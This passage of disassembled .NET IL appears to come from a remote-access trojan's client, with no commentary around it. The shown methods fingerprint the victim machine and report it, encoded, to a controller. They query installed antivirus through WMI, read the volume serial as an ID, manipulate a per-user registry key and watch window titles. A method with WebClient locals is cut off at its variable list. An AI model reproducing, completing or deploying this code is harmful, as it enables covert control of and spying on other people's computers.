          IL_0225:  stelem.ref
          IL_0226:  nop
          IL_0227:  ldloc.s    V_16
          IL_0229:  ldc.i4.4
          IL_022a:  ldstr      "\r\n"
          IL_022f:  stelem.ref
          IL_0230:  nop
          IL_0231:  ldloc.s    V_16
          IL_0233:  ldc.i4.5
          IL_0234:  ldsfld     bool j.OK::Idr
          IL_0239:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_023e:  stelem.ref
          IL_023f:  nop
          IL_0240:  ldloc.s    V_16
          IL_0242:  ldc.i4.6
          IL_0243:  ldstr      "\r\n"
          IL_0248:  stelem.ref
          IL_0249:  nop
          IL_024a:  ldloc.s    V_16
          IL_024c:  ldc.i4.7
          IL_024d:  ldsfld     bool j.OK::IsF
          IL_0252:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0257:  stelem.ref
          IL_0258:  nop
          IL_0259:  ldloc.s    V_16
          IL_025b:  ldc.i4.8
          IL_025c:  ldstr      "\r\n"
          IL_0261:  stelem.ref
          IL_0262:  nop
          IL_0263:  ldloc.s    V_16
          IL_0265:  ldc.i4.s   9
          IL_0267:  ldsfld     bool j.OK::Isu
          IL_026c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0271:  stelem.ref
          IL_0272:  nop
          IL_0273:  ldloc.s    V_16
          IL_0275:  ldc.i4.s   10
          IL_0277:  ldstr      "\r\n"
          IL_027c:  stelem.ref
          IL_027d:  nop
          IL_027e:  ldloc.s    V_16
          IL_0280:  ldc.i4.s   11
          IL_0282:  ldsfld     bool j.OK::BD
          IL_0287:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_028c:  stelem.ref
          IL_028d:  nop
          IL_028e:  ldloc.s    V_16
          IL_0290:  call       string [mscorlib]System.String::Concat(string[])
          IL_0295:  stloc.s    V_8
          IL_0297:  ldstr      "inf"
          IL_029c:  ldsfld     string j.OK::Y
          IL_02a1:  ldloca.s   V_8
          IL_02a3:  call       string j.OK::ENB(string&)
          IL_02a8:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_02ad:  call       bool j.OK::Send(string)
          IL_02b2:  pop
          IL_02b3:  leave.s    IL_02d7

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_02b5:  dup
          IL_02b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_02bb:  stloc.s    V_10
          IL_02bd:  nop
          IL_02be:  ldloc.s    V_10
          IL_02c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_02c5:  nop
          IL_02c6:  ldloc.s    V_10
          IL_02c8:  stloc.s    V_9
          IL_02ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02cf:  nop
          IL_02d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_02d5:  leave.s    IL_02d7

        }  // end handler
        IL_02d7:  nop
        IL_02d8:  leave.s    IL_0302

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02da:  dup
        IL_02db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02e0:  stloc.s    V_12
        IL_02e2:  nop
        IL_02e3:  ldloc.s    V_12
        IL_02e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02ea:  nop
        IL_02eb:  ldloc.s    V_12
        IL_02ed:  stloc.s    V_11
        IL_02ef:  ldc.i4.0
        IL_02f0:  stsfld     bool j.OK::Cn
        IL_02f5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02fa:  nop
        IL_02fb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0300:  leave.s    IL_0302

      }  // end handler
      IL_0302:  nop
      IL_0303:  nop
      IL_0304:  leave.s    IL_030f

    }  // end .try
    finally
    {
      IL_0306:  ldloc.s    V_13
      IL_0308:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_030d:  nop
      IL_030e:  endfinally
    }  // end handler
    IL_030f:  nop
    IL_0310:  ldsfld     bool j.OK::Cn
    IL_0315:  stloc.0
    IL_0316:  br.s       IL_0318

    IL_0318:  ldloc.0
    IL_0319:  ret
  } // end of method OK::connect

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       21 (0x15)
    .maxstack  1
    .locals init (string V_0,
             uint8[] V_1)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldind.ref
    IL_0003:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0008:  stloc.1
    IL_0009:  ldloca.s   V_1
    IL_000b:  call       string j.OK::BS(uint8[]&)
    IL_0010:  stloc.0
    IL_0011:  br.s       IL_0013

    IL_0013:  ldloc.0
    IL_0014:  ret
  } // end of method OK::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       80 (0x50)
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string j.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  ldc.i4.1
      IL_0021:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0026:  ldarg.0
      IL_0027:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002c:  nop
      IL_002d:  leave.s    IL_004d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002f:  dup
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0035:  stloc.1
      IL_0036:  nop
      IL_0037:  ldloc.1
      IL_0038:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003d:  nop
      IL_003e:  ldloc.1
      IL_003f:  stloc.0
      IL_0040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0045:  nop
      IL_0046:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004b:  leave.s    IL_004d

    }  // end handler
    IL_004d:  nop
    IL_004e:  nop
    IL_004f:  ret
  } // end of method OK::DLV

  .method public static void  ED() cil managed
  {
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  call       void j.OK::pr(int32)
    IL_0007:  nop
    IL_0008:  nop
    IL_0009:  ret
  } // end of method OK::ED

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  1
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       uint8[] j.OK::SB(string&)
    IL_0007:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000c:  stloc.0
    IL_000d:  br.s       IL_000f

    IL_000f:  ldloc.0
    IL_0010:  ret
  } // end of method OK::ENB

  .method public static string  GetAntiVirus() cil managed
  {
    // Code size       586 (0x24a)
    .maxstack  7
    .locals init (string V_0,
             int32 V_1,
             string V_2,
             object[] V_3,
             bool[] V_4,
             class [mscorlib]System.Collections.IEnumerator V_5,
             int32 V_6,
             int32 V_7,
             object V_8,
             object V_9,
             object V_10,
             object V_11,
             class _Object V_12,
             object[] V_13,
             bool[] V_14,
             int32 V_15,
             int32 V_16,
             bool V_17,
             int32 V_18)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  nop
      IL_0003:  nop
      IL_0004:  ldc.i4.1
      IL_0005:  stloc.s    V_7
      IL_0007:  ldstr      "Select * From AntiVirusProduct"
      IL_000c:  stloc.s    V_8
      IL_000e:  nop
      IL_000f:  nop
      IL_0010:  ldc.i4.2
      IL_0011:  stloc.s    V_7
      IL_0013:  ldstr      "winmgmts:\\\\.\\root\\SecurityCenter2"
      IL_0018:  ldnull
      IL_0019:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::GetObject(string,
                                                                                                      string)
      IL_001e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0023:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0028:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002d:  stloc.s    V_10
      IL_002f:  nop
      IL_0030:  nop
      IL_0031:  ldc.i4.3
      IL_0032:  stloc.s    V_7
      IL_0034:  ldc.i4.1
      IL_0035:  newarr     [mscorlib]System.Object
      IL_003a:  stloc.s    V_13
      IL_003c:  ldloc.s    V_13
      IL_003e:  ldc.i4.0
      IL_003f:  ldloc.s    V_8
      IL_0041:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0046:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_004b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0050:  stelem.ref
      IL_0051:  nop
      IL_0052:  ldloc.s    V_13
      IL_0054:  stloc.3
      IL_0055:  ldc.i4.1
      IL_0056:  newarr     [mscorlib]System.Boolean
      IL_005b:  stloc.s    V_14
      IL_005d:  ldloc.s    V_14
      IL_005f:  ldc.i4.0
      IL_0060:  ldc.i4.1
      IL_0061:  stelem.i1
      IL_0062:  ldloc.s    V_14
      IL_0064:  stloc.s    V_4
      IL_0066:  ldloc.s    V_4
      IL_0068:  ldc.i4.0
      IL_0069:  ldelem.i1
      IL_006a:  stloc.s    V_17
      IL_006c:  ldloc.s    V_17
      IL_006e:  brfalse.s  IL_0084

      IL_0070:  ldloc.3
      IL_0071:  ldc.i4.0
      IL_0072:  ldelem.ref
      IL_0073:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0078:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_007d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0082:  stloc.s    V_8
      IL_0084:  nop
      IL_0085:  ldloc.s    V_10
      IL_0087:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_008c:  ldnull
      IL_008d:  ldstr      "ExecQuery"
      IL_0092:  ldloc.3
      IL_0093:  ldnull
      IL_0094:  ldnull
      IL_0095:  ldloc.s    V_4
      IL_0097:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_009c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00a1:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00a6:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00ab:  stloc.s    V_9
      IL_00ad:  nop
      IL_00ae:  nop
      IL_00af:  ldc.i4.4
      IL_00b0:  stloc.s    V_7
      IL_00b2:  ldloc.s    V_9
      IL_00b4:  castclass  [mscorlib]System.Collections.IEnumerable
      IL_00b9:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.IEnumerable::GetEnumerator()
      IL_00be:  stloc.s    V_5
      IL_00c0:  br.s       IL_0117

      IL_00c2:  ldloc.s    V_5
      IL_00c4:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
      IL_00c9:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00ce:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00d3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00d8:  stloc.s    V_11
      IL_00da:  nop
      IL_00db:  nop
      IL_00dc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e1:  nop
      IL_00e2:  ldc.i4.1
      IL_00e3:  stloc.s    V_6
      IL_00e5:  nop
      IL_00e6:  nop
      IL_00e7:  ldc.i4.6
      IL_00e8:  stloc.s    V_7
      IL_00ea:  ldloc.s    V_11
      IL_00ec:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00f1:  ldnull
      IL_00f2:  ldstr      "displayName"
      IL_00f7:  ldc.i4.0
      IL_00f8:  newarr     [mscorlib]System.Object
      IL_00fd:  ldnull
      IL_00fe:  ldnull
      IL_00ff:  ldnull
      IL_0100:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0105:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_010a:  stloc.2
      IL_010b:  nop
      IL_010c:  leave      IL_022f

      IL_0111:  nop
      IL_0112:  nop
      IL_0113:  ldc.i4.7
      IL_0114:  stloc.s    V_7
      IL_0116:  nop
      IL_0117:  ldloc.s    V_5
      IL_0119:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_011e:  stloc.s    V_17
      IL_0120:  ldloc.s    V_17
      IL_0122:  brtrue.s   IL_00c2

      IL_0124:  ldloc.s    V_5
      IL_0126:  isinst     [mscorlib]System.IDisposable
      IL_012b:  ldnull
      IL_012c:  cgt.un
      IL_012e:  stloc.s    V_17
      IL_0130:  ldloc.s    V_17
      IL_0132:  brfalse.s  IL_0141

      IL_0134:  ldloc.s    V_5
      IL_0136:  isinst     [mscorlib]System.IDisposable
      IL_013b:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0140:  nop
      IL_0141:  nop
      IL_0142:  nop
      IL_0143:  nop
      IL_0144:  ldc.i4.8
      IL_0145:  stloc.s    V_7
      IL_0147:  ldstr      "No Antivirus"
      IL_014c:  stloc.2
      IL_014d:  nop
      IL_014e:  leave      IL_022f

      IL_0153:  nop
      IL_0154:  nop
      IL_0155:  ldc.i4.0
      IL_0156:  stloc.1
      IL_0157:  nop
      IL_0158:  ldloc.1
      IL_0159:  ldc.i4.1
      IL_015a:  add.ovf
      IL_015b:  ldc.i4.1
      IL_015c:  sub
      IL_015d:  stloc.s    V_18
      IL_015f:  ldloc.s    V_18
      IL_0161:  switch     ( 
                            IL_018c,
                            IL_0194,
                            IL_019c,
                            IL_01a4,
                            IL_01ac,
                            IL_01b4,
                            IL_01bc,
                            IL_01c4,
                            IL_01cc)
      IL_018a:  br.s       IL_01d2

      IL_018c:  nop
      IL_018d:  br         IL_0003

      IL_0192:  br.s       IL_01d6

      IL_0194:  nop
      IL_0195:  br         IL_000f

      IL_019a:  br.s       IL_01d6

      IL_019c:  nop
      IL_019d:  br         IL_0030

      IL_01a2:  br.s       IL_01d6

      IL_01a4:  nop
      IL_01a5:  br         IL_00ae

      IL_01aa:  br.s       IL_01d6

      IL_01ac:  nop
      IL_01ad:  br         IL_00db

      IL_01b2:  br.s       IL_01d6

      IL_01b4:  nop
      IL_01b5:  br         IL_00e6

      IL_01ba:  br.s       IL_01d6

      IL_01bc:  nop
      IL_01bd:  br         IL_0112

      IL_01c2:  br.s       IL_01d6

      IL_01c4:  nop
      IL_01c5:  br         IL_0143

      IL_01ca:  br.s       IL_01d6

      IL_01cc:  nop
      IL_01cd:  nop
      IL_01ce:  leave.s    IL_022f

      IL_01d0:  br.s       IL_01d6

      IL_01d2:  nop
      IL_01d3:  nop
      IL_01d4:  leave.s    IL_0222

      IL_01d6:  nop
      IL_01d7:  nop
      IL_01d8:  nop
      IL_01d9:  ldloc.s    V_7
      IL_01db:  stloc.1
      IL_01dc:  nop
      IL_01dd:  ldloc.s    V_6
      IL_01df:  stloc.s    V_18
      IL_01e1:  ldloc.s    V_18
      IL_01e3:  switch     ( 
                            IL_01f2,
                            IL_01f8)
      IL_01f0:  br.s       IL_01fe

      IL_01f2:  nop
      IL_01f3:  nop
      IL_01f4:  leave.s    IL_0222

      IL_01f6:  br.s       IL_01fe

      IL_01f8:  nop
      IL_01f9:  br         IL_0154

      IL_01fe:  nop
      IL_01ff:  leave.s    IL_0220

    }  // end .try
    catch _Object 
    {
      IL_0201:  dup
      IL_0202:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0207:  stloc.s    V_12
      IL_0209:  nop
      IL_020a:  ldloc.s    V_12
      IL_020c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0211:  nop
      IL_0212:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0217:  leave.s    IL_01d8

      IL_0219:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021e:  leave.s    IL_0220

    }  // end handler
    IL_0220:  nop
    IL_0221:  nop
    IL_0222:  nop
    IL_0223:  ldc.i4     0x800a0033
    IL_0228:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_022d:  throw

    IL_022e:  nop
    IL_022f:  nop
    IL_0230:  ldloc.1
    IL_0231:  ldc.i4.0
    IL_0232:  ceq
    IL_0234:  ldc.i4.0
    IL_0235:  ceq
    IL_0237:  stloc.s    V_17
    IL_0239:  ldloc.s    V_17
    IL_023b:  brfalse.s  IL_0243

    IL_023d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_0242:  nop
    IL_0243:  nop
    IL_0244:  ldloc.2
    IL_0245:  stloc.0
    IL_0246:  br.s       IL_0248

    IL_0248:  ldloc.0
    IL_0249:  ret
  } // end of method OK::GetAntiVirus

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow_() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32" as "FindWindowA" nomangle ansi lasterr winapi) 
          int32  _FindWindow_(string&  marshal( byvalstr) lpClassName,
                              string&  marshal( byvalstr) lpWindowName) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  _SetWindowPos(int32 hwnd,
                               int32 hWndInsertAfter,
                               int32 x,
                               int32 y,
                               int32 cx,
                               int32 cy,
                               int32 wFlags) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          void  _SendMessage(int32 hWnd,
                             uint32 msg,
                             uint32 wParam,
                             int32 lparam) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" as "SystemParametersInfoA" nomangle ansi lasterr winapi) 
          int32  _SystemParametersInfo(int32 uAction,
                                       int32 uParam,
                                       string&  marshal( byvalstr) lpvParam,
                                       int32 fuWinIni) cil managed preservesig
  {
  }
  .method public static object  GTV(string n,
                                    object 'ret') cil managed
  {
    // Code size       111 (0x6f)
    .maxstack  3
    .locals init (object V_0,
             object V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string j.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0025:  ldarg.0
      IL_0026:  ldarg.1
      IL_0027:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0031:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0036:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_003b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0040:  stloc.1
      IL_0041:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0043:  dup
      IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0049:  stloc.3
      IL_004a:  nop
      IL_004b:  ldloc.3
      IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0051:  nop
      IL_0052:  ldloc.3
      IL_0053:  stloc.2
      IL_0054:  ldarg.1
      IL_0055:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_005a:  stloc.1
      IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0060:  nop
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  nop
    IL_0069:  ldloc.1
    IL_006a:  stloc.0
    IL_006b:  br.s       IL_006d

    IL_006d:  ldloc.0
    IL_006e:  ret
  } // end of method OK::GTV

  .method public static string  HWD() cil managed
  {
    // Code size       111 (0x6f)
    .maxstack  8
    .locals init (string V_0,
             string V_1,
             int32 V_2,
             string V_3,
             int32 V_4,
             string V_5,
             int32 V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             string V_9)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldnull
      IL_0003:  stloc.s    V_5
      IL_0005:  ldc.i4.0
      IL_0006:  stloc.s    V_4
      IL_0008:  ldc.i4.0
      IL_0009:  stloc.2
      IL_000a:  ldnull
      IL_000b:  stloc.3
      IL_000c:  ldstr      "SystemDrive"
      IL_0011:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0016:  ldstr      "\\"
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  stloc.s    V_9
      IL_0022:  ldloca.s   V_9
      IL_0024:  ldloca.s   V_5
      IL_0026:  ldc.i4.0
      IL_0027:  ldloca.s   V_6
      IL_0029:  ldloca.s   V_4
      IL_002b:  ldloca.s   V_2
      IL_002d:  ldloca.s   V_3
      IL_002f:  ldc.i4.0
      IL_0030:  call       int32 j.OK::GetVolumeInformation(string&,
                                                            string&,
                                                            int32,
                                                            int32&,
                                                            int32&,
                                                            int32&,
                                                            string&,
                                                            int32)
      IL_0035:  pop
      IL_0036:  ldloc.s    V_6
      IL_0038:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003d:  stloc.1
      IL_003e:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0040:  dup
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0046:  stloc.s    V_8
      IL_0048:  nop
      IL_0049:  ldloc.s    V_8
      IL_004b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0050:  nop
      IL_0051:  ldloc.s    V_8
      IL_0053:  stloc.s    V_7
      IL_0055:  ldstr      "ERR"
      IL_005a:  stloc.1
      IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0060:  nop
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  nop
    IL_0069:  ldloc.1
    IL_006a:  stloc.0
    IL_006b:  br.s       IL_006d

    IL_006d:  ldloc.0
    IL_006e:  ret
  } // end of method OK::HWD

  .method public static pinvokeimpl("user32" as "FindWindowA" nomangle ansi lasterr winapi) 
          int32  FindWindow_(string&  marshal( byvalstr) lpClassName,
                             string&  marshal( byvalstr) lpWindowName) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  SetWindowPos_(int32 hwnd,
                               int32 hWndInsertAfter,
                               int32 x,
                               int32 y,
                               int32 cx,
                               int32 cy,
                               int32 wFlags) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          void  SendMessage_(int32 hWnd,
                             uint32 msg,
                             uint32 wParam,
                             int32 lparam) cil managed preservesig
  {
  }
  .method private static void  ImHere(object a0,
                                      class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void j.OK::ED()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method OK::ImHere

  .method public static void  Ind(uint8[] b) cil managed noinlining nooptimization
  {
    // Code size       9649 (0x25b1)
    .maxstack  9
    .locals init (string[] V_0,
             uint8[] V_1,
             uint8[] V_2,
             class [System]System.Net.WebClient V_3,
             class [System]System.Net.WebClient V_4,
             string V_5,
             string V_6,
             string V_7,
             string V_8,
             string V_9,
             uint8[] V_10,
             string V_11,
             object V_12,
             uint8[] V_13,
             string V_14,
             object V_15,
             class [mscorlib]System.Exception V_16,
             string V_17,
             string V_18,
             class [mscorlib]System.IO.StreamReader V_19,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon V_20,
             string V_21,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons V_22,
             string[] V_23,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons V_24,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon V_25,
             string V_26,
             class [mscorlib]System.Exception V_27,
             class [mscorlib]System.IO.DriveInfo[] V_28,
             class [mscorlib]System.IO.DriveInfo V_29,
             class [mscorlib]System.Exception V_30,
             string[] V_31,
             string V_32,
             class [mscorlib]System.Exception V_33,
             int32 V_34,
             int32 V_35,
             string V_36,
             string V_37,
             bool V_38,
             bool V_39,
             class [mscorlib]System.Exception V_40,
             class [mscorlib]System.Exception V_41,
             string V_42,
             string V_43,
             string V_44,
             string V_45,
             string V_46,
             string V_47,
             string V_48,
             int32 V_49,
             int32 V_50,
             int32 V_51,
             int32 V_52,
             string V_53,
             object V_54,
             string[] V_55,
             string V_56,
